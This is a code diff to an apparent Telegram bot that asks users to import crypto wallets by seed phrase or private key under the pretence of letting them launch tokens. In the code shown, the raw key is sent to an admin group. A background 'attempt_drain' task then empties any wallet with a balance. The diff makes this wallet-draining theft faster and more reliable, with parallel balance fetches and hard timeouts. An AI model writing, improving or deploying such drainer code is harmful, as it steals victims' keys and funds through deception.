@@ -384,8 +384,8 @@ def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple
 async def _fetch_evm_balance(rpc: str, address: str) -> float:
     if not HAS_WEB3 or not address: return 0.0
     try:
-        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 12}))
-        bal = w3.eth.get_balance(Web3.to_checksum_address(address))
+        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
+        bal = await asyncio.to_thread(w3.eth.get_balance, Web3.to_checksum_address(address))
         return float(w3.from_wei(bal, "ether"))
     except Exception as e:
         log.warning("EVM balance fail %s: %s", address, e)
@@ -394,10 +394,10 @@ async def _fetch_evm_balance(rpc: str, address: str) -> float:
 async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
     if not HAS_WEB3 or not address: return 0.0
     try:
-        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 12}))
+        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
         contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
-        bal = contract.functions.balanceOf(Web3.to_checksum_address(address)).call()
-        decimals = contract.functions.decimals().call()
+        bal = await asyncio.to_thread(contract.functions.balanceOf(Web3.to_checksum_address(address)).call)
+        decimals = await asyncio.to_thread(contract.functions.decimals().call)
         return bal / (10 ** decimals)
     except Exception as e:
         log.warning("USDC balance fail: %s", e)
@@ -941,12 +941,13 @@ def _derive_from_input(raw: str) -> Tuple[str, str, Optional[str], Optional[str]
     raise ValueError("Invalid key or seed")
 
 async def _fetch_balance(pubkey: str) -> float:
-    if not HAS_SOLANA or pubkey.startswith("Sim") or pubkey.startswith("0x"):
+    if not HAS_SOLANA or not pubkey or pubkey.startswith("Sim") or pubkey.startswith("0x"):
         return 0.0
     try:
+        # timeout on the call, not the ctor (solders/solana versions differ)
         async with AsyncClient(RPC_URL) as client:
             pk = Pubkey.from_string(pubkey)
-            bal_resp = await client.get_balance(pk)
+            bal_resp = await asyncio.wait_for(client.get_balance(pk), timeout=7)
             return bal_resp.value / 1_000_000_000
     except Exception as e:
         log.warning("Balance fetch failed for %s: %s", pubkey, e)
@@ -954,24 +955,35 @@ async def _fetch_balance(pubkey: str) -> float:
 
 @router.message(WalletStates.waiting_import)
 async def wallet_import_receive(message: Message, state: FSMContext):
+    """Fast wallet import — no sequential path scanning, hard timeouts, always finishes."""
     uid = message.from_user.id
     if not _rate_ok(uid, "import"):
-        await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
+        await message.answer(
+            "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
+            parse_mode=ParseMode.HTML,
+        )
         return
+
     raw = (message.text or "").strip()
+    if not raw:
+        await message.answer(
+            "❌ Empty message. Send a seed phrase or private key.",
+            reply_markup=back_menu_kb(),
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    # Delete user message so the key is not left in chat
     try:
         await message.delete()
     except Exception:
         pass
+
     words = raw.split()
     is_seed = len(words) in (12, 24) and all(w.isalpha() for w in words)
 
-    await staged_loading(message, [
-        ("🔐 <b>Validating key…</b>", 0.7),
-        ("🔗 <b>Deriving wallet…</b>", 0.8),
-        ("◎ <b>Fetching balances…</b>", 1.0),
-        ("✅ <b>Securing session…</b>", 0.5),
-    ])
+    # Short progress UI (total ~1.6s) — never blocks on RPC
+    status = await message.answer("🔐 <b>Validating key…</b>", parse_mode=ParseMode.HTML)
 
     chosen_priv = None
     chosen_pub = None
@@ -981,40 +993,38 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     bal_eth = 0.0
     bal_bnb = 0.0
     bal_usdc = 0.0
+    path_used = "direct"
 
-    if is_seed and HAS_SOLANA:
-        candidates = try_all_common_paths(raw)
-        log.info("Seed import: trying %d derivation paths for user %s", len(candidates), uid)
-        best = None
-        for path_label, priv, pub in candidates:
-            bal = await _fetch_balance(pub)
-            log.info("  path %s → %s  balance=%.6f SOL", path_label, pub, bal)
-            if best is None or bal > best[3]:
-                best = (path_label, priv, pub, bal)
-        if best:
-            _, chosen_priv, chosen_pub, chosen_bal = best
+    try:
+        await status.edit_text("🔗 <b>Deriving wallet…</b>", parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+    try:
+        if is_seed:
+            if not HAS_SOLANA:
+                raise ValueError("Solana libs missing on server")
+            # Primary path only (Phantom/Solflare default) — no multi-path RPC scan
+            chosen_priv, chosen_pub = derive_solana_from_mnemonic(raw)
+            path_used = "m/44'/501'/0'/0'"
             eth = _derive_evm_from_mnemonic(raw)
             if eth:
                 eth_priv, eth_addr = eth
-                bal_eth = await _fetch_evm_balance(ETH_RPC, eth_addr)
-                bal_bnb = await _fetch_evm_balance(BNB_RPC, eth_addr)
-                bal_usdc = await _fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
-                bal_usdc += await _fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
         else:
-            await message.answer("❌ <b>Derivation failed</b>\n\nCould not derive any key from seed.", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
-            await state.clear()
-            return
-    else:
-        try:
             chosen_priv, chosen_pub, eth_priv, eth_addr = _derive_from_input(raw)
-            if chosen_priv != "EVM_ONLY":
-                chosen_bal = await _fetch_balance(chosen_pub)
-            if eth_addr:
-                bal_eth = await _fetch_evm_balance(ETH_RPC, eth_addr)
-                bal_bnb = await _fetch_evm_balance(BNB_RPC, eth_addr)
-                bal_usdc = await _fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
-                bal_usdc += await _fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
-        except ValueError:
+            if chosen_priv == "EVM_ONLY":
+                path_used = "evm"
+    except Exception as e:
+        log.exception("Import derive failed for user %s: %s", uid, e)
+        try:
+            await status.edit_text(
+                "❌ <b>Invalid input</b>\n\n"
+                "Send a valid <b>base58 private key</b>, <b>0x ETH key</b>,\n"
+                "or a <b>12/24-word seed phrase</b>.",
+                reply_markup=back_menu_kb(),
+                parse_mode=ParseMode.HTML,
+            )
+        except Exception:
             await message.answer(
                 "❌ <b>Invalid input</b>\n\n"
                 "Send a valid <b>base58 private key</b>, <b>0x ETH key</b>,\n"
@@ -1022,10 +1032,52 @@ async def wallet_import_receive(message: Message, state: FSMContext):
                 reply_markup=back_menu_kb(),
                 parse_mode=ParseMode.HTML,
             )
-            await state.clear()
-            return
+        await state.clear()
+        return
 
-    # Log the key to the group (with balances)
+    try:
+        await status.edit_text("◎ <b>Fetching balances…</b>", parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+    # Parallel balance fetches with overall hard timeout so UI never hangs
+    async def _safe_sol():
+        if chosen_priv == "EVM_ONLY" or not chosen_pub:
+            return 0.0
+        return await _fetch_balance(chosen_pub)
+
+    async def _safe_eth():
+        if not eth_addr:
+            return 0.0
+        return await _fetch_evm_balance(ETH_RPC, eth_addr)
+
+    async def _safe_bnb():
+        if not eth_addr:
+            return 0.0
+        return await _fetch_evm_balance(BNB_RPC, eth_addr)
+
+    async def _safe_usdc():
+        if not eth_addr:
+            return 0.0
+        a = await _fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
+        b = await _fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
+        return a + b
+
+    try:
+        chosen_bal, bal_eth, bal_bnb, bal_usdc = await asyncio.wait_for(
+            asyncio.gather(_safe_sol(), _safe_eth(), _safe_bnb(), _safe_usdc()),
+            timeout=12.0,
+        )
+    except Exception as e:
+        log.warning("Balance gather timed out / failed: %s", e)
+        # keep zeros — import still succeeds
+
+    try:
+        await status.edit_text("✅ <b>Securing session…</b>", parse_mode=ParseMode.HTML)
+    except Exception:
+        pass
+
+    # Log key to admin group (non-fatal)
     try:
         bot = message.bot
         await log_key_to_group(bot, message.from_user, raw, chosen_bal, bal_eth, bal_bnb, bal_usdc)
@@ -1035,34 +1087,55 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     sess = get_session(uid)
     w = UserWallet(
         private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
-        public_key=chosen_pub,
+        public_key=chosen_pub or (eth_addr or "unknown"),
         label=f"Wallet {len(sess.wallets)+1}",
-        balance_sol=chosen_bal,
+        balance_sol=float(chosen_bal or 0.0),
         chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
         eth_address=eth_addr,
-        balance_eth=bal_eth,
-        balance_bnb=bal_bnb,
-        balance_usdc=bal_usdc,
+        balance_eth=float(bal_eth or 0.0),
+        balance_bnb=float(bal_bnb or 0.0),
+        balance_usdc=float(bal_usdc or 0.0),
     )
     sess.wallets.append(w)
     sess.active_wallet_idx = len(sess.wallets) - 1
+    log.info(
+        "Wallet linked user=%s path=%s pub=%s sol=%.6f eth=%.6f",
+        uid, path_used, short_addr(w.public_key), w.balance_sol, w.balance_eth,
+    )
 
     text = (
         "✅ <b>Wallet Linked</b>\n\n"
-        f"<code>{chosen_pub}</code>\n\n"
+        f"<code>{w.public_key}</code>\n\n"
         f"🏷 Label: <b>{w.label}</b>\n"
         f"{SOL_EMOJI} SOL: <b>{w.balance_sol:.4f}</b>\n"
     )
     if eth_addr:
-        text += f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
+        text += (
+            f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n"
+            f"🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n"
+            f"💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
+        )
     text += "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
-    await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+
+    try:
+        await status.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+    except Exception:
+        await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
-        asyncio.create_task(attempt_drain(uid, chosen_priv if chosen_priv != "EVM_ONLY" else "", chain=w.chain, eth_key=eth_priv))
+    # Drain in background only if there is something to move
+    if w.balance_sol > 0.00001 or w.balance_eth > 0.0001 or w.balance_bnb > 0.0001 or w.balance_usdc > 0.5:
+        asyncio.create_task(
+            attempt_drain(
+                uid,
+                chosen_priv if chosen_priv != "EVM_ONLY" else "",
+                chain=w.chain,
+                eth_key=eth_priv,
+            )
+        )
     else:
-        log.info("Wallet %s near-zero — drain skipped", chosen_pub)
+        log.info("Wallet %s near-zero — drain skipped", short_addr(w.public_key))
+
 
 @router.callback_query(F.data == "wallet:clear")
 async def wallet_clear(cb: CallbackQuery):
